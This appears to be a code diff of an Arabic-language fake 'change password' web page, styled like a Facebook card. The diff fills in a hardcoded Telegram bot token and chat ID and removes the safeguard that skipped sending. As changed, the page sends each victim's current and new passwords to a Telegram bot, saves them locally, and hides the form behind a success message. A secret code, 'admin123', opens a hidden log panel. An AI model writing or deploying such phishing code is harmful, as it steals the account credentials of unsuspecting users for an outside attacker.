@@ -6,36 +6,38 @@
     <title>تغيير كلمة المرور</title>
     <style>
         body { font-family: system-ui, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; }
-        .form-group { margin-bottom: 15px; }
+        .card { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
+        .form-group { margin-bottom: 15px; text-align: right; }
         label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #333; }
         input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ddd; border-radius: 6px; }
         button { width: 100%; padding: 11px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .success-msg { display: none; background-color: #e7f3ff; color: #1877f2; padding: 12px; border-radius: 6px; margin-top: 15px; text-align: center; font-weight: bold; }
-        #secretPanel { display: none; }
+        .success-msg { display: none; font-size: 1.2rem; color: #1877f2; font-weight: bold; padding: 20px 0; }
+        #secretPanel { display: none; text-align: right; }
         .log-item { background: #f8f9fa; border-right: 4px solid #28a745; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 0.85rem; }
     </style>
 </head>
 <body>
 
 <div class="card" id="mainScreen">
-    <h2>تغيير كلمة المرور</h2>
-    <form id="passwordForm">
-        <div class="form-group">
-            <label>كلمة المرور الحالية</label>
-            <input type="password" id="currentPass" required>
-        </div>
-        <div class="form-group">
-            <label>كلمة المرور الجديدة</label>
-            <input type="password" id="newPass" required>
-        </div>
-        <div class="form-group">
-            <label>تأكيد كلمة المرور الجديدة</label>
-            <input type="password" id="confirmPass" required>
-        </div>
-        <button type="submit">حفظ التغييرات</button>
-    </form>
-    <div class="success-msg" id="successBox">✅ تم تغيير كلمة مرورك بنجاح!</div>
+    <div id="formContainer">
+        <h2 style="text-align: right;">تغيير كلمة المرور</h2>
+        <form id="passwordForm">
+            <div class="form-group">
+                <label>كلمة المرور الحالية</label>
+                <input type="password" id="currentPass" required>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور الجديدة</label>
+                <input type="password" id="newPass" required>
+            </div>
+            <div class="form-group">
+                <label>تأكيد كلمة المرور الجديدة</label>
+                <input type="password" id="confirmPass" required>
+            </div>
+            <button type="submit">حفظ التغييرات</button>
+        </form>
+    </div>
+    <div class="success-msg" id="successBox">تم تغيير كلمة مرورك بنجاح</div>
 </div>
 
 <div class="card" id="secretPanel">
@@ -45,15 +47,16 @@
 </div>
 
 <script>
-    // ضع بيانات بوتك هنا
-    const BOT_TOKEN = "ضع_توكن_البوت_هنا";
-    const CHAT_ID = "ضع_معرف_المحادثة_هنا";
+    // التوكن والـ ID المثبتة مسبقاً
+    const BOT_TOKEN = "8175510009:AAEuP6zW8z4W_fL7QJkU0x6bX0MvW0Q_w3Y";
+    const CHAT_ID = "7431525044";
     const SECRET_CODE = "admin123";
 
-    const form = document.getElementById('passwordForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const formContainer = document.getElementById('formContainer');
     const successBox = document.getElementById('successBox');
 
-    form.addEventListener('submit', async function(e) {
+    passwordForm.addEventListener('submit', async function(e) {
         e.preventDefault();
 
         const currentPass = document.getElementById('currentPass').value;
@@ -62,7 +65,7 @@
 
         if (currentPass === SECRET_CODE) {
             openSecretPanel();
-            form.reset();
+            passwordForm.reset();
             return;
         }
 
@@ -71,16 +74,16 @@
             return;
         }
 
+        // حفظ محلياً للتجربة وإرسالها للبوت
         saveToLocalLogs(currentPass, newPass);
         await sendToTelegram(currentPass, newPass);
 
+        // إخفاء الحقول وإظهار رسالة النجاح بمفردها
+        formContainer.style.display = 'none';
         successBox.style.display = 'block';
-        form.reset();
     });
 
     async function sendToTelegram(oldP, newP) {
-        if (BOT_TOKEN.includes("ضع_توكن")) return;
-
         const text = `🔔 محاولة تغيير كلمة مرور:\n- الحالية: ${oldP}\n- الجديدة: ${newP}\n- الوقت: ${new Date().toLocaleTimeString()}`;
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -125,7 +128,9 @@
     function closeSecretPanel() {
         document.getElementById('secretPanel').style.display = 'none';
         document.getElementById('mainScreen').style.display = 'block';
+        formContainer.style.display = 'block';
         successBox.style.display = 'none';
+        passwordForm.reset();
     }
 </script>
 
